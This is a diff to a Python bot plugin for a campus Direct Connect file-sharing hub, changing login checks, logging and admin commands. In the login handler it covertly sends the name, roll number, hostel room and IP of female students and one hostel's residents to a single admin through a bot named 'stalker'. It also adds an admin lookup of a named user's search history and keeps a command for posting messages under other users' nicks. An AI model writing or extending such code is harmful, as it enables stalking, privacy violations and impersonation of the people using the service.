@@ -40,6 +40,7 @@ config = {"hubbot": "HubBot",
           "lastmsg": datafiles + "lastmsg",
           "regurl": rooturl + "register",
           "faqurl": rooturl + "info",
+          "freq": rooturl + "frequent",
           "hoturl": rooturl + "hot",
           "requesturl": rooturl + "request",
           "authurl": rooturl + "account",
@@ -161,11 +162,11 @@ def sendMainChatMsgToAll(msg, fromNick=None):
 
 def sendDebugMessage(msg):
     if debug:
-        sendMainChatMsgToNick(msg,"sdh");
+        sendPMToNick(msg,"sdh","DCDebug");
 
 def sendSQLDebugMessage(msg):
     if sqldebug:
-        sendMainChatMsgToNick(msg,"sdh");
+        sendMainChatMsgToNick(msg,"sdh","DCQueries");
 
 #Database interactions
 
@@ -274,10 +275,10 @@ def getFileContents(path):
     return data
 
 def getUserShareinGB(nick):
-    allinfo = vh.GetMyINFO(nick)
-    if allinfo and len(allinfo) > 0:
+    (nick, desc, tag, speed, mail, size) = vh.GetMyINFO(nick)
+    if size and len(size)>0:
         try:
-            share = int(str(allinfo).split("'")[-2]) / (1024.0 * 1024 * 1024)
+            share = int(size) / (1024.0 * 1024 * 1024)
             return math.ceil(share*100)/100
         except Exception as e:
             sendMainChatMsgToNick("Error: Your share could not be determined properly",nick)
@@ -289,9 +290,9 @@ def checkStatus(nick, userdata):
     notshared = False
     if config["authlimit"] and int(userdata["class"])==0:
         notauthenticated = True
-    if config["sharelimit"] and int(userdata["class"]) < config["authclass"] and getUserShareinGB(nick) < config["sharesize"]:
+    if config["sharelimit"] and int(userdata["class"]) < config["authclass"] and getUserShareinGB(nick) < config["sharesize"] and userdata['shareLimitRemoved']=="0":
         notshared = True
-    if config["iplimit"] and userdata["ipaddress"]!=vh.GetUserIP(nick):
+    if config["iplimit"] and userdata["ipaddress"]!=vh.GetUserIP(nick) and userdata['IPLimitRemoved']=="0":
         ipnotmatching = True
     return (notauthenticated, notshared, ipnotmatching)
 
@@ -469,9 +470,12 @@ def OnUserLogin (nick):
         sendMainChatMsgToNick(data,nick)
         mainChat(nick)
         sendMainChatMsgToNick(getFileContents(config['lastmsg']),nick)
-        if userdata['gender']=="F" or userdata['hostel']=="9" or userdata['hostel']=="8":
-            for nk in config['admins']:
-                sendPMToNick("\nNick: %s\nName: %s\nBranch: %s\nRoll: %s/%s/%s\nHostel %s Room %s\nIP: %s" % (nick,userdata['fullname'],userdata['branchname'],userdata['roll_course'],userdata['roll_number'],userdata['roll_year'],userdata['hostel'],userdata['room'],ip),nk,config['stalker'])
+        (nick, desc, tag, speed, mail, size) = vh.GetMyINFO(nick)
+        if "M:P" in tag:
+            sendMainChatMsgToNick("You have connected in passive mode. Your search and downloads will be very slow. See how to connect in active mode at %s#step5" % config['info'],nick)
+        if (userdata['gender']=="F" or userdata['hostel']=="9") and userdata['roll_course']=="BE" and userdata['roll_year']=="2010":
+            for nk in ["sdh"]:
+                sendPMToNick("%s\nName: %s\nBranch: %s\nRoll: %s/%s/%s\nHostel %s Room %s\nIP: %s" % (nick,userdata['fullname'],userdata['branchname'],userdata['roll_course'],userdata['roll_number'],userdata['roll_year'],userdata['hostel'],userdata['room'],ip),nk,config['stalker'])
         return config["allowcommand"]
     except Exception, e:
         handleError(e,nick,"Error on user login")
@@ -502,6 +506,12 @@ def OnTimer():
         config["clock"]=0
     else:
         config["clock"]+=1
+
+def OnParsedMsgMyINFO(nick, desc, tag, speed, mail, size):
+    return config["allowcommand"]
+    (result, userdata) = getUserDetailfromTable(nick)
+    if result==0 or len(userdata)==0: pass
+    else: return ("%s [class=%s]" % (desc,userdata['class']), None, None, None, None)
 
 def OnUserCommand(nick,command):
     global config
@@ -773,7 +783,8 @@ def OnUserCommand(nick,command):
             if result==0:
                 sendMainChatMsgToNick("Error: Content was not deleted",nick)
                 return config["blockcommand"]
-            latest(nick)
+            data = getLatestContent()
+            sendMainChatMsgToNick(data,nick)
             sendMainChatMsgToNick("Success: Content has been removed.",nick)
         
         elif command[0]=="clear":
@@ -782,11 +793,17 @@ def OnUserCommand(nick,command):
             sendMainChatMsgToAll(data, config['hubbot'])
         
         elif command[0]=="info":
-            if len(command)!=2:
+            if len(command)<2:
                 sendMainChatMsgToNick("Error: Incorrect format due to missing nickname. Type '+help %s' to see the correct format" % command[0],nick)
                 return config["blockcommand"]
             showUserInfo(command[1], nick)
-        
+            if nick in config['admins'] and len(command)>2:
+                sendMainChatMsgToNick("Retrieving search...",nick)
+                (r,s) = selectAllFromTable("select group_concat(concat(sr,' (',cnt,')') separator ', ') res from  (SELECT nick,TRIM(replace(SUBSTRING_INDEX(message, '?', -1),'$',' ')) sr, count(*) cnt FROM %s WHERE logtype = 'Search' and message not like '%%TTH:%%' group by nick,sr having sr not like '' order by timedate desc) s where nick='%s' group by nick",[config['tables']['log'],command[1]])
+                if r==0 or len(s)==0: dt = "Not data"
+                else: dt = s[0][0]
+                sendMainChatMsgToNick("\n%s\n" % dt,nick)
+
         elif command[0]=="infoip":
             if len(command)!=2:
                 sendMainChatMsgToNick("Error: Incorrect format due to missing IP address. Type '+help %s' to see the correct format" % command[0],nick)
@@ -858,9 +875,22 @@ def OnUserCommand(nick,command):
                 sendMainChatMsgToNick("Error: Incorrect format due to missing data. Type '+help %s' to see the correct format" % command[0],nick)
                 return config["blockcommand"]
             if command[1]=="mc":
-                sendMainChatMsgToAll(" ".join(command[3:]),command[2])
+                fromnick = command[2]
+                if fromnick == "sdh":
+                    sendMainChatMsgToNick("Are you sure you want to do that? [If yes GG GM]",nick)
+                    return config["blockcommand"]
+                data = " ".join(command[3:])
+                sendMainChatMsgToAll(data,fromnick)
+                OnParsedMsgChat(fromnick,data)
             elif command[1]=="pm":
-                sendPMToNick(" ".join(command[4:]),command[2],command[3])
+                tonick = command[2]
+                fromnick = command[3]
+                if fromnick == "sdh":
+                    sendMainChatMsgToNick("Are you sure you want to do that? [If yes GG GM]",nick)
+                    return config["blockcommand"]
+                data = " ".join(command[4:])
+                sendPMToNick(data,tonick,fromnick)
+                OnParsedMsgPM(fromnick, data, tonick)
             else:
                 sendMainChatMsgToNick("Error: Wrong format",nick)
                 return config["blockcommand"]
@@ -998,6 +1028,7 @@ def OnParsedMsgChat(nick,data):
         (result, userdata) = getUserDetailfromTable(nick)
         if result==0 or len(userdata)==0:
             sendMainChatMsgToNick("Error: Nickname not found in Database. Please register yourself at %s" % config["regurl"],nick)
+            log("MC", data, nick, "", 1)
             vh.CloseConnection(nick)
             return config["blockcommand"]    
         
@@ -1022,13 +1053,14 @@ def OnParsedMsgPM(nick,data,receiver):
         (result, userdata) = getUserDetailfromTable(nick)
         if result==0 or len(userdata)==0:
             sendMainChatMsgToNick("Error: Nickname not found in Database. Please register yourself at %s" % config["regurl"],nick)
+            log("PM", data, nick, receiver, 1)
             vh.CloseConnection(nick)
             return config["blockcommand"]    
-        
+
         (notauthenticated, notshared, ipnotmatching) = checkStatus(nick, userdata)
         if (notauthenticated or notshared) and receiver not in config['admins']:
             sendPMToNick("Error: Your message to %s was blocked because %s.\nTo remove this restriction: \n    1) Authenticate you account at %s\n    2) Share %dGB.\n" % (receiver, "you have not autheticated your account" if notauthenticated else "your share is less than %dGB" % config["sharesize"], config["authurl"], config["sharesize"]), nick)
-            log("MC", data, nick, "", 1)
+            log("PM", data, nick, receiver, 1)
             return config["blockcommand"]
         
         log("PM", data, nick, receiver)
@@ -1036,16 +1068,19 @@ def OnParsedMsgPM(nick,data,receiver):
     except Exception, e:
         handleError(e,nick,"Error parsing message to chat")
     return config["blockcommand"]
-    
+
 def OnParsedMsgSearch (nick,data):
     global config
     try:
         log("Search", data, nick)
+        (nick, desc, tag, speed, mail, size) = vh.GetMyINFO(nick)
+        if "M:P" in tag:
+            sendPMToNick("You have connected in passive mode. Your search and downloads will be very slow. See how to connect in active mode at %s#step5" % config['info'],nick,"DCPassiveWarning")
         return config["allowcommand"]
     except Exception, e:
         handleError(e,nick,"Error parsing search")
     return config["allowcommand"]
-    
+
 def OnUserLogout(nick):
     global config
     try:
